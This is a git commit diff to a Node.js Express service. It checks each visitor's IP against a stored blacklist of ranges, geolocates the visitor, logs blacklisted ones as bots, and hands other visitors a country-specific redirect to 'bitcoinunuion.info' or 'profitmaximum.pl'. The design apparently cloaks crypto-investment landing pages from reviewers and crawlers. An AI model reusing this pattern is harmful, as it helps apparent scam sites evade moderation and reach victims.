9f65de85cdb7a1d5084d96a5ea1f5e5891a9d14e
Jenia22f <Nofightnoglory22>
2020-08-13 13:27:08 +0300

    check ip

--- app.js
+++ app.js
@@ -6,9 +6,8 @@ const urlRoute = require('./routes/url');
 const keys = require('./config/keys')
 const app = express();
 
-
 mongoose.connect(keys.mongoURI, {useUnifiedTopology: true})
-    .then(()=> console.log('MongoDB connected'))
+    .then(() => console.log('MongoDB connected'))
     .catch(error => console.log(error));
 
 app.use(require('morgan')('dev'))
@@ -16,36 +15,79 @@ app.use(bodyParser.urlencoded({extended: true}))
 app.use(bodyParser.json())
 app.use(require('cors')())
 
-
+//Start download black ip from ips.txt
 // const fs = require("fs");
+// const Netmask = require('netmask').Netmask
+// const Address6 = require('ip-address').Address6;
+// const ip6addr = require('ip6addr')
 // const Ip = require('./models/IpAddress');
 // fs.readFile("./txt/ips.txt", "utf8",
-//     (error,data) => {
-//     let array = data.split('\n')
-//         let arr1 = array.map(arr => arr.split('-'));
-//         arr1.map(i => {
-//            let newArr = []
-//            let y = i.map(a => {
-//            a = a.split('.').map(item => {
-//                     if ((item.length < 1)) return item = '000'
-//                     if (item.length === 1) return   item = '00' + item
-//                     if (item.length === 2) return  item = '0' + item
-//                     if (item.length === 3 || item.length > 3) return item
+//     (error, data) => {
+//         let array = data.split('\n').map(arr => arr.split('-'));
+//         array.map(i => {
+//             if (i[0].includes('/') && ip6addr.parse(i[0].substr(0, i[0].indexOf('/'))).kind() === 'ipv6') {
+//                 let ipv6Ip = ip6addr.createCIDR(i[0].split('/')[0], +i[0].split('/')[1])
+//                 let addr = ip6addr.parse(i[0].split('/')[0])
+//                 i[0] = i[0].split('/')[0].split(':')
+//                 i[1] = ipv6Ip.last().toString()
+//
+//                 i[0] = i[0].map(el => {
+//                     if ((el.length === 0)) return '0000'
+//                     if (el.length === 1) return '000' + el
+//                     if (el.length === 2) return '00' + el
+//                     if (el.length === 3) return '0' + el
+//                     if (el.length === 4) return el
 //                 })
+//                 let ipLast = new Address6(ipv6Ip.last().toString());
+//                 let last = ipLast.inspectTeredo();
+//                 i[1] = last.server4;
 //
-//                newArr.push(a)
-//            })
-//                 if (!newArr[1]) return ['000', '000', '000', '000']
-//            const ip = new Ip({
-//                    firstDiapason: newArr[0].join(''),
-//                    secondDiapason: newArr[1].join('')
-//                })
-//                ip.save()
-//        });
+//                 i[0] = makeStartRangeForIpv6(i[0])
+//                 let ipFirst = new Address6(i[0].join(':'));
+//                 let first = ipFirst.inspectTeredo();
+//                 i[0] = first.server4;
+//             }
+//             if (!i[1]) i[1] = '000.000.000.000'
+//             if (i[0].includes('/')) {
+//                 let diapIp = new Netmask(i[0]);
+//                 i[0] = diapIp.base
+//                 i[1] = diapIp.last
+//             }
 //
+//             let ipDiapason = createDiapasonArray(i)
+//             const ip = new Ip({
+//                 firstDiapason: ipDiapason[0].join(''),
+//                 secondDiapason: ipDiapason[1].join('')
+//             })
 //
+//             ip.save()
+//         });
 //     });
+//
+// function makeStartRangeForIpv6(array) {
+//     if (array.length < 8) {
+//         array.push('0000')
+//         makeStartRangeForIpv6(array)
+//     }
+//     return array
+// }
+//
+// function createDiapasonArray(i) {
+//     let newArr = []
+//
+//     let y = i.map(a => {
+//         a = a.split('.').map(item => {
+//             if ((item.length < 1)) return item = '000'
+//             if (item.length === 1) return item = '00' + item
+//             if (item.length === 2) return item = '0' + item
+//             if (item.length === 3 || item.length > 3) return item
+//         })
+//         newArr.push(a)
+//     })
+//     return newArr
+// }
 
+//End download black ip from ips.txt
 
 app.use('/api/url', urlRoute)
 
--- controllers/url.js
+++ controllers/url.js
@@ -1,4 +1,6 @@
 const geoip = require('geoip-lite');
+const ip6addr = require('ip6addr');
+const Address6 = require('ip-address').Address6;
 const Ip = require('../models/IpAddress');
 const User = require('../models/User');
 const errorHandler = require('../utils/errorHandler');
@@ -6,8 +8,13 @@ const errorHandler = require('../utils/errorHandler');
 module.exports.getUrl = async function (req, res) {
     try {
         // let ip = req.ip
+        // let userAgent = req.headers['user-agent'];
         let ip = "114.104.182.143"
+        // let ip = "2a03:2880:f122::"
         // let ip = "46.133.255.255"
+        if (ip6addr.parse(ip).kind() === 'ipv6') {
+            ip = new Address6(ip).inspectTeredo().server4;
+        }
         if (ip.substr(0, 7) === "::ffff:") {
             ip = ip.substr(7)
         }
@@ -21,46 +28,45 @@ module.exports.getUrl = async function (req, res) {
         }
         const allBlackIp = await Ip.find({})
         const block = parceIpForCompare(ip, allBlackIp);
-
         if (block) {
-                const user = new User({
-                    UserAgent: req.body.UserAgent,
-                    UTM: req.body.UTM,
-                    reason: 'This ip is in black list!',
-                    language: req.body.language,
-                    url: null,
-                    ip,
-                    country: data.countryCode,
-                    city: data.city,
-                    bot: 1,
-                    unique
-                });
-                await user.save()
-                res.status(200).json(false)
-        } else {
-                let reason = null
-                if (url === null) {
-                    reason = 'Invalid country'
-                    res.status(200).json(false)
-                } else {
-                    res.status(200).json({
-                        status: true,
-                        url
-                    })
-                }
             const user = new User({
-                    UserAgent: req.body.UserAgent,
-                    UTM: req.body.UTM,
-                    reason: reason,
-                    language: req.body.language,
-                    url: data.url,
-                    ip,
-                    country: data.countryCode,
-                    city: data.city,
-                    bot: 0,
-                    unique
-                });
-                await user.save()
+                UserAgent: req.body.UserAgent,
+                UTM: req.body.UTM,
+                reason: 'This ip is in black list!',
+                language: req.body.language,
+                url: null,
+                ip,
+                country: data.countryCode,
+                city: data.city,
+                bot: 1,
+                unique
+            });
+            await user.save()
+            res.status(200).json(false)
+        } else {
+            let reason = null
+            if (url === null) {
+                reason = 'Invalid country'
+                res.status(200).json(false)
+            } else {
+                res.status(200).json({
+                    status: true,
+                    url
+                })
+            }
+            const user = new User({
+                UserAgent: req.body.UserAgent,
+                UTM: req.body.UTM,
+                reason: reason,
+                language: req.body.language,
+                url: data.url,
+                ip,
+                country: data.countryCode,
+                city: data.city,
+                bot: 0,
+                unique
+            });
+            await user.save()
         }
 
     } catch (e) {
@@ -68,7 +74,7 @@ module.exports.getUrl = async function (req, res) {
     }
 }
 
- function checkCountry(ip) {
+function checkCountry(ip) {
     let geo = geoip.lookup(ip);
     let countryCode;
     let city;
@@ -81,34 +87,34 @@ module.exports.getUrl = async function (req, res) {
         city = geo.city;
         switch (geo.country) {
             case "CN":
-                 url = 'bitcoinunuion.info'
+                url = 'bitcoinunuion.info'
                 break
             case "UK":
-                 url = 'bitcoinunuion.info'
+                url = 'bitcoinunuion.info'
                 break
             case "AU":
-                 url = 'bitcoinunuion.info'
+                url = 'bitcoinunuion.info'
                 break
             case "SG":
-                 url = 'bitcoinunuion.info'
+                url = 'bitcoinunuion.info'
                 break
             case "PL":
-                 url = 'profitmaximum.pl'
-            break
+                url = 'profitmaximum.pl'
+                break
             default:
-                 url = null;
-                 break
+                url = null;
+                break
         }
 
     }
-     return {url, countryCode, city}
+    return {url, countryCode, city}
 }
 
 function parceIpForCompare(ip, allBlackIp) {
-   let newIp = ip.split('.').map(item => {
+    let newIp = ip.split('.').map(item => {
         if ((item.length < 1)) return item = '000'
-        if (item.length === 1) return   item = '00' + item
-        if (item.length === 2) return  item = '0' + item
+        if (item.length === 1) return item = '00' + item
+        if (item.length === 2) return item = '0' + item
         if (item.length === 3 || item.length > 3) return item
     })
     return compareIp(newIp.join(''), allBlackIp)
@@ -117,7 +123,9 @@ function parceIpForCompare(ip, allBlackIp) {
 function compareIp(ip, allBlackIp) {
     let block = false;
     allBlackIp.map(item => {
-        if (item.firstDiapason <= ip && item.secondDiapason >= ip) {
+        if (item.firstDiapason <= ip && item.secondDiapason >= ip &&
+            item.firstDiapason !== '000000000000' &&
+            item.secondDiapason !== '255255255255') {
             block = true
         }
     })
